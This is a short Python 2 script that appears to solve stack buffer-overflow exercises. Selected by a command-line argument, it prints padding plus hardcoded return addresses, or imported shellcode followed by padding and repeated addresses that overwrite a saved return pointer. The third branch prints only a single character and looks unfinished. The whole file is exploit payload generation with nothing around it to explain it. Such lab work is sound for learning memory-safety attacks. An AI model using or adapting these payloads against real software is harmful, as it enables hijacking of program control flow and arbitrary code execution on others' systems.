from shellcode import shellcode 
from struct import pack 
import sys 

if sys.argv[1] == "1" :
    print  "A"*40 + pack("<I", 0xbffea0dc);
if sys.argv[1] == "2" :
    print shellcode + "A"*(17)+ pack("<I",0xbffff590 )+pack("<I",0xbffff590 )
if sys.argv[1] == "3":
    print "A"
